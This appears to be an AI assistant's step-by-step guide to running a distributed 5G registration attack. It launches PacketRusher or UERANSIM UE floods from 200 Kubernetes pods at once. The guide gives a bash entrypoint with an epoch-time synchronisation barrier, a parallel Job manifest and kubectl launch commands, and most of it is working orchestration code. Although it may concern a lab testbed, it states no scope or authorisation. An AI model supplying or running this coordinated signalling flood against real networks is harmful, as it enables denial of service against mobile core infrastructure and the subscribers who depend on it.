# Distributed 5G Registration Attack via Kubernetes

Based on the repository, the attack relies on either **PacketRusher** (`/home/vagrant/PacketRusher/packetrusher multi-ue-pdu ...`) or **UERANSIM** (`/ueransim/bin/nr-ue -c ... -n 50`). 

To run these tools from 200 different pods concurrently with precise timing, you face one major challenge: **Kubernetes pod startup times are inconsistent**. Node scheduling, image pulling, and container bootstrapping means your 200 pods will start seconds (or even minutes) apart. 

To solve this, you need a **Synchronization Barrier**.

## Approach: Kubernetes Indexed Jobs + Epoch Time Barrier

The most reliable way to achieve exact, simultaneous execution without external dependencies (like Redis) is to use a Kubernetes `Job` with a predefined, synchronized target start time. 

### Step 1: Dockerize the Attacker
Ensure you have a Docker image containing either your PacketRusher binary or UERANSIM binary, along with the configurations (`config.yml` or `custom-ue.yaml`). 

### Step 2: Formulate the Time Barrier Script
Inside your container, instead of directly running the tool, wrap it in a bash script that waits for a specific UNIX epoch time before executing. Because Kubernetes nodes sync their clocks via NTP, this guarantees millisecond-level precision across all 200 pods.

```bash
#!/bin/bash
# entrypoint.sh

# The exact UNIX epoch time when the attack should begin.
# E.g., You calculate the current epoch time, add 60 seconds to allow all 200 pods to spawn, and pass it here.
TARGET_TIME=$1 

CURRENT_TIME=$(date +%s)
SLEEP_TIME=$(( TARGET_TIME - CURRENT_TIME ))

if [ "$SLEEP_TIME" -gt "0" ]; then
    echo "Waiting $SLEEP_TIME seconds for synchronization barrier..."
    sleep $SLEEP_TIME
fi

echo "Barrier reached. Launching attack precisely at $(date)..."

# --- Launch the chosen attack tool ---
# For PacketRusher:
# /PacketRusher/packetrusher --config /config.yml multi-ue-pdu --number-of-ues 10 --timeBetweenRegistration 100 --loop

# For UERANSIM:
# /ueransim/bin/nr-ue -c /custom-ue.yaml -n 50
```

### Step 3: Launch with a Kubernetes Job

To deploy 200 pods, you can use a `Job` with `parallelism: 200`.

Save the following as `attack-job.yaml`:

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: 5g-registration-attack-job
spec:
  completions: 200
  parallelism: 200
  template:
    spec:
      containers:
      - name: attacker
        image: <your-registry>/5g-attacker:latest
        command: ["/bin/bash", "/entrypoint.sh"]
        args: 
          # Calculate this right before applying: $(date -d "1 minute" +%s)
          - "1700000000" 
        resources:
          requests:
            cpu: "100m"
            memory: "128Mi"
      restartPolicy: Never
```

### Execution Workflow

1. Calculate a start time roughly 1-2 minutes in the future to give Kubernetes enough time to schedule and start 200 pods.
   ```bash
   TARGET_EPOCH=$(date -d "+90 seconds" +%s)
   echo "Target start time: $TARGET_EPOCH"
   ```
2. Inject `$TARGET_EPOCH` into your `attack-job.yaml` args.
3. Apply the Job:
   ```bash
   kubectl apply -f attack-job.yaml
   ```
4. **Result:** All 200 pods will start, initialize, compute the required sleep time, sleep, and then exactly fire off the PacketRusher or UERANSIM command at the very same second.
